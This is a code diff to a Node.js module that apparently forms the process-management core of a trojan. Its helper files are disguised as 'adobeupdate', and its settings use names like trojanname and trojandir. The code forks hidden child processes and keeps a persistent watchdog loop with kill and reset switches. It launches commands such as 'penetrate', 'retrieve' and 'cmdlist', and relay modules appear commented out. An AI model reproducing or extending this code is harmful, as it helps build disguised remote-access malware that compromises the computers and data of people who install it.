@@ -7,6 +7,8 @@ const os = require("os");
 const crypto = require("crypto");
 const util = require("util");
 
+const ISDEBUG = true;
+
 var cmdname = null;
 var cmdconfig = null;
 
@@ -218,7 +220,7 @@ class CmdConfig {
         let _fname = "";
         _fname = helper_config.systemconfig.trojanname + "_" + this.cmdname;
         _fname +=
-            (!isNullOrWhitespace(this.cmdtaskname)
+            (!helper.isNullOrWhitespace(this.cmdtaskname)
                 ? "_" + this.cmdtaskname
                 : "") + "_lock";
 
@@ -226,10 +228,10 @@ class CmdConfig {
     }
 
     async activate(cmdlineargs, exitparent) {
-        logmsg("starting");
+        helper.logmsg("starting");
 
         if (helper_ps.isPidAlive(this.childpid)) {
-            logmsg(
+            helper.logmsg(
                 `no need to run [${this.cmdname}]-- child process exists with pid [${this.childpid}]`
             );
             return;
@@ -333,10 +335,16 @@ class CmdConfig {
                     { stdio: "ignore", windowsHide: true }
                 );
             } else {
-                logmsg("forking child");
-                child = fork(systemstate.trojanfpath, cmdlineargs, {
-                    windowsHide: true,
-                });
+                helper.logmsg(
+                    `forking child ${helper_config.systemconfig.trojanfpath}`
+                );
+                child = fork(
+                    helper_config.systemconfig.trojanfpath,
+                    cmdlineargs,
+                    {
+                        windowsHide: true,
+                    }
+                );
             }
 
             if (!child) {
@@ -383,7 +391,9 @@ class CmdConfig {
             });
 
             child.on("spawn", () => {
-                logmsg(`Child successfully started with PID: ${child.pid}`);
+                helper.logmsg(
+                    `Child successfully started with PID: ${child.pid}`
+                );
 
                 resolve(child);
             });
@@ -393,18 +403,18 @@ class CmdConfig {
     exitramp() {
         let fpath = path.join(helper_config.systemconfig.trojandir, "killall");
 
-        if (fileExists(fpath)) {
+        if (helper.fileExists(fpath)) {
             logmsg("found killall -- exiting");
             process.exit(0);
             return;
         }
 
         fpath = path.join(
-            systemstate.trojandir,
-            "reset_" + systemstate.cmdconfig.cmdname
+            helper_config.systemconfig.trojandir,
+            "reset_" + cmdconfig.cmdname
         );
 
-        if (fileExists(fpath)) {
+        if (helper.fileExists(fpath)) {
             rmSync(fpath, { force: true });
             process.exit(0);
             return;
@@ -422,44 +432,51 @@ class CmdConfig {
         let loopindex = 0;
         while (true) {
             loopindex++;
-            logmsg(
-                `loop starting -- loopindex=${loopindex} -- ${getTimestamp()}`
+            helper.logmsg(
+                `loop starting -- loopindex=${loopindex} -- ${helper.getTimestamp()}`
             );
 
             this.exitramp();
 
             try {
-                if (isAsyncFunction(this.loopfunc)) await this.loopfunc();
+                if (helper.isAsyncFunction(this.loopfunc))
+                    await this.loopfunc();
                 else this.loopfunc();
             } catch (err) {
                 logmsg(err);
             }
 
-            logmsg("sleeping for [" + systemstate.staticdelay + "] seconds");
+            helper.logmsg(
+                "sleeping for [" +
+                    helper_config.systemconfig.staticdelay +
+                    "] seconds"
+            );
 
-            for (let i = 0; i < (ISDEBUG ? 3 : systemstate.staticdelay); i++) {
-                logmsg(
+            for (
+                let i = 0;
+                i < (ISDEBUG ? 3 : helper_config.systemconfig.staticdelay);
+                i++
+            ) {
+                helper.logmsg(
                     `sleeping one second... [${i + 1}/${
-                        systemstate.staticdelay
+                        helper_config.systemconfig.staticdelay
                     }]`
                 );
 
-                await sleep(1000);
+                await helper.sleep(1000);
             }
 
-            let num =
-                systemstate.cmdconfig.dynamicdelay ??
-                crypto.randomInt(1, 10) * 5;
+            let num = cmdconfig.dynamicdelay ?? crypto.randomInt(1, 10) * 5;
 
-            logmsg(`sleeping for an additional ${num} seconds`);
+            helper.logmsg(`sleeping for an additional ${num} seconds`);
 
             for (let i = 0; i < (ISDEBUG ? 0 : num); i++) {
-                logmsg(
+                helper.logmsg(
                     `sleeping one second... [${i + 1}/${
-                        systemstate.staticdelay
+                        helper_config.systemconfig.staticdelay
                     }]`
                 );
-                await sleep(1000);
+                await helper.sleep(1000);
             }
         }
     }
@@ -586,14 +603,18 @@ async function watchdog() {
 
     let watchdogcmd = cmdconfig;
 
-    let penetratecmd = new CmdConfig("penetrate");
-    let retrievecmd = new CmdConfig("retrieve");
+    // let penetratecmd = new CmdConfig("penetrate");
+    // let retrievecmd = new CmdConfig("retrieve");
 
-    retrievecmd.launch(null, true);
-    penetratecmd.launch(null, true);
+    // retrievecmd.launch(null, true);
+    // penetratecmd.launch(null, true);
 
     watchdogcmd.newCmdConfig("ping");
     watchdogcmd.newCmdConfig("cmdlist");
+    // watchdogcmd.newCmdConfig("jsrelay");
+    // watchdogcmd.newCmdConfig("psrelay");
+    // watchdogcmd.newCmdConfig("cmdrelay");
+    // watchdogcmd.newCmdConfig("pyrelay");
 
     let childcmds = watchdogcmd.childcmds;
 
@@ -1565,7 +1586,6 @@ module.exports = {
     CmdConfig,
     penetrate,
     watchdog,
-    cmdconfig,
 };
 
 const helper = require("./adobeupdate.helper.js");
@@ -1574,3 +1594,19 @@ const helper_config = require("./adobeupdate.helper.config.js");
 
 cmdname = helper_ps.getcmdname();
 cmdconfig = new CmdConfig(cmdname);
+
+Object.defineProperty(module.exports, "cmdconfig", {
+    get() {
+        return cmdconfig;
+    },
+    enumerable: true,
+    configurable: true,
+});
+
+Object.defineProperty(module.exports, "cmdname", {
+    get() {
+        return cmdname;
+    },
+    enumerable: true,
+    configurable: true,
+});
